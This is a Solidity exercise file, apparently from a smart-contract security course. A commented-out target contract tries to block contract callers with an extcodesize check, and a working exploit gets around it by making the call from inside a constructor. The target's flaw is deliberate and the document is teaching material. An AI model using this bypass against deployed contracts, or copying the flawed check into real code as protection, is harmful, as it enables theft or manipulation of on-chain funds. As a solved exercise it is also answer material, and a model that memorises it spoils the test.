/*

Contracts cannot call the fallback of this contract.

contract NoContract {
    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    modifier noContract() {
        require(!isContract(msg.sender), "no contract allowed");
        _;
    }

    bool public pwned = false;

    fallback() external noContract {
        pwned = true;
    }
}

Task:
    - Set pwned to true. The fallback function in NoContract will be called from your pwn function inside your exploit contract.

*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Zero {
    constructor(address _target) {
        // Contract size is zero while the code inside constructor is executing.
        _target.call("");
    }
}

contract NoContractExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // Inside pwn, deploy a new contract that calls target.
        new Zero(target);
    }
}
